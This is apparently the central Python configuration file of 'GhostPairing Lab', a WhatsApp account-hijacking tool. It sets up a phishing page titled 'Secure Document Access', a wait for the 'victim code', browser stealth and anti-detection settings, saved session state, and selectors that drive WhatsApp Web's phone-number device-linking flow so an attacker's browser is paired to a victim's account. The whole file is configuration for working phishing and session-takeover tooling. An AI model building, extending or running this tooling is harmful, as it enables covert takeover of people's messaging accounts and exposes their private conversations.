"""
GhostPairing Lab — Centralized Configuration
Single source of truth for all settings. Override via environment variables.
"""
import os
import re
from pathlib import Path

# ── Paths ──────────────────────────────────────────────
BASE_DIR = Path(__file__).resolve().parent
LOG_DIR = BASE_DIR / "logs"
DB_DIR = BASE_DIR / "databases"
SESSION_DIR = BASE_DIR / "sessions"
TEMPLATES_DIR = BASE_DIR / "templates"
STATIC_DIR = TEMPLATES_DIR / "static"

# Ensure directories exist
for d in (LOG_DIR, DB_DIR, SESSION_DIR):
    d.mkdir(parents=True, exist_ok=True)

# ── Server ─────────────────────────────────────────────
HOST = os.getenv("GHOSTPAIR_HOST", "0.0.0.0")
PORT = int(os.getenv("GHOSTPAIR_PORT", "8000"))
CORS_ORIGINS = os.getenv("GHOSTPAIR_CORS", "*").split(",")

# ── Security ───────────────────────────────────────────
ADMIN_TOKEN = os.getenv("GHOSTPAIR_ADMIN_TOKEN", "changeme")

# ── Rate Limiting ──────────────────────────────────────
RATE_LIMIT_ENABLED = os.getenv("GHOSTPAIR_RATE_LIMIT", "true").lower() == "true"
RATE_LIMIT_REQUESTS = int(os.getenv("GHOSTPAIR_RATE_LIMIT_REQUESTS", "30"))
RATE_LIMIT_WINDOW = int(os.getenv("GHOSTPAIR_RATE_LIMIT_WINDOW", "60"))  # seconds

# ── Database ───────────────────────────────────────────
DB_PATH = str(DB_DIR / "whatsapp.db")
DB_WAL_MODE = True

# ── Logging ────────────────────────────────────────────
LOG_LEVEL = os.getenv("GHOSTPAIR_LOG_LEVEL", "INFO")
LOG_FORMAT = "json" if os.getenv("GHOSTPAIR_LOG_JSON", "true").lower() == "true" else "console"
LOG_FILE = str(LOG_DIR / "ghostpairing.log")
LOG_MAX_SIZE = "10 MB"
LOG_RETENTION = 5  # backup files
LOG_PHONE_REDACTION = True  # truncate phone numbers in logs

# ── Automation / Browser ───────────────────────────────
BROWSER_HEADLESS = os.getenv("GHOSTPAIR_HEADLESS", "false").lower() == "true"
BROWSER_TIMEOUT = int(os.getenv("GHOSTPAIR_BROWSER_TIMEOUT", "600"))   # victim code wait
CODE_CAPTURE_TIMEOUT = int(os.getenv("GHOSTPAIR_CODE_CAPTURE_TIMEOUT", "45"))
PAIRING_CHECK_TIMEOUT = int(os.getenv("GHOSTPAIR_PAIRING_CHECK_TIMEOUT", "60"))
BROWSER_SLOW_MO = int(os.getenv("GHOSTPAIR_SLOW_MO", "100"))  # ms delay between actions

# ── Session Persistence ────────────────────────────────
BROWSER_PROFILE_DIR = str(SESSION_DIR / "browser_profile")
SESSION_STORAGE_FILE = str(SESSION_DIR / "storage_state.json")

# ── Anti-Detection ─────────────────────────────────────
STEALTH_ENABLED = os.getenv("GHOSTPAIR_STEALTH", "true").lower() == "true"
USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
)
VIEWPORT_WIDTH = 1280
VIEWPORT_HEIGHT = 720
LOCALE = "en-US"
TIMEZONE_ID = "America/New_York"

# ── Phishing Page ──────────────────────────────────────
PHISHING_REDIRECT_URL = os.getenv(
    "GHOSTPAIR_REDIRECT_URL", "https://www.linkedin.com"
)
PHISHING_TITLE = "Secure Document Access"

# ── Phone Validation ───────────────────────────────────
PHONE_PATTERN = re.compile(r"^\+\d{7,15}$")
CODE_PATTERN = re.compile(r"^\d{6}$")

# ── WhatsApp Web Selectors ─────────────────────────────
# Centralized so they can be updated when WhatsApp changes its UI
WHATSAPP_URL = "https://web.whatsapp.com"

LINK_PHONE_BUTTONS = [
    'div[role="button"]:has-text("phone number")',
    'div[role="button"]:has-text("log in")',
    'div[role="button"]:has-text("Log in")',
    'div[role="button"]:has-text("Link with")',
    'span[role="button"]:has-text("Link with phone")',
    'button:has-text("phone")',
    'button[data-testid="link-device-header"]',
]

PHONE_INPUTS = [
    'input[type="tel"]',
    'input[inputmode="tel"]',
    'input[aria-label*="phone"]',
    'input[aria-label*="Phone"]',
    'input[placeholder*="phone"]',
    'input[placeholder*="Phone"]',
]

NEXT_BUTTONS = [
    'text="Next"',
    'button:has-text("Next")',
    'div[role="button"]:has-text("Next")',
    'button[aria-label*="Next"]',
]

CODE_INPUTS = [
    'input[inputmode="numeric"]:not([maxlength="1"])',
    'input[type="number"]:not([maxlength="1"])',
    'input[data-testid="code-input"]',
    'input[aria-label*="code"]',
    'input[aria-label*="Code"]',
]

DIGIT_INPUTS = [
    'input[inputmode="numeric"][maxlength="1"]',
    'input[type="tel"][maxlength="1"]',
    'input[aria-label*="digit"]',
]

VERIFY_BUTTONS = [
    'text="Verify"',
    'text="Next"',
    'button:has-text("Verify")',
    'button:has-text("Next")',
    'button[aria-label*="Verify"]',
]

SUCCESS_INDICATORS = [
    'div[data-testid="chat-list"]',
    'div[aria-label="Chat list"]',
    'header[data-testid="chatlist-header"]',
    '[data-testid="conversation-panel-wrapper"]',
    '[data-icon="chat"]',
    'span[data-icon="menu"]',
    'div[role="textbox"][data-tab]',
]

# WhatsApp displays an 8-char code: XXXX-XXXX
CODE_DISPLAY_PATTERN = re.compile(
    r"([A-Z0-9]{4})\s*[-–—]\s*([A-Z0-9]{4})", re.IGNORECASE
)
